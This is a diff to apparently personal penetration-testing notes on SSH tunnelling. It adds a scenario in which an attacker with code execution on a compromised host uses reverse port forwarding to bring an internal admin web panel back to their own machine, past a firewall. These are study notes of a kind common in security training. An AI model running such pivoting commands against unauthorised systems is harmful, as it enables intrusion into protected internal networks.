@@ -26,7 +26,7 @@ This will create an SSH tunnel to relay connection to your host's port 3307 to t
 
 ### Scenario 2:
 - The service of my exploited machine (10.10.1.10) is serving only at lo interface at 127.0.0.1:3306. It does not serve at 0.0.0.0:3306.
-- There is *no open* SSH server at 0.0.0.0:22. The port is filtered. There is a firewall blocking. 
+- There is *no open* SSH server at 10.10.1.10:22 nor 0.0.0.0:22. The port is filtered. There is a firewall blocking. 
 - I have gained of Remote Code Execution on the machine. 
 - There is an SSH client inside the exploited server.
 - I would like to tunnel the service back to my host machine (10.10.1.32)
@@ -96,7 +96,30 @@ Then, by using SSH dynamic port forwarding, we create a SOCKS proxy at port 8001
 Next, we can process to prefix any CLI commands with proxychains that will route our requests through this SOCKS proxy and reach the admin panel.
 The benefit of this is that we are no longer limited to a single remote target hardcoded in our Local Port Forwarding. 
 
-### Scenario 4:
+### Scenario 4: 
+- I have exploited a machine (10.10.1.10) that has access to another internal admin network on another network interface eth2 (172.16.1.10).
+- There is an admin web interface at 172.16.1.2:80 that I would like to access to this through my exploited machine as a jump host.
+- There is *no open* SSH server at 10.10.1.10:22 nor 0.0.0.0:22. The port is filtered. There is a firewall blocking. 
+- I have gained of Remote Code Execution on the machine. 
+- There is an SSH client inside the exploited server.
+- I would like to tunnel the service back to my host machine (10.10.1.32)
+
+Technique: Reverse/Remote Port Forwarding via SSH a single internal target back to host.
+
+```sh
+(host)# service ssh start
+(exploited)$ ssh -R 8001:172.16.1.2:80 kali@10.10.1.32
+(host)# netstat -antp
+...
+tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      115384/sshd
+...
+(host)# curl -v http://127.0.0.1:8001/
+```
+
+**Explanation:**
+This is similar to Scenario 2. We changed the 127.0.0.1 to the intranet web portal service at 172.16.1.2:80.
+
+### Scenario 5:
 - I have gained access to intranet admin web portal (172.16.1.2:80) via my exploited jump host (10.10.1.10 or 172.16.1.10) via Scenario 3.
 - I found a vulnerability on 172.16.1.2:80 and I want to get a reverse connection back to my host machine (10.10.1.32). 
 - There is an SSH client inside the jumphost.
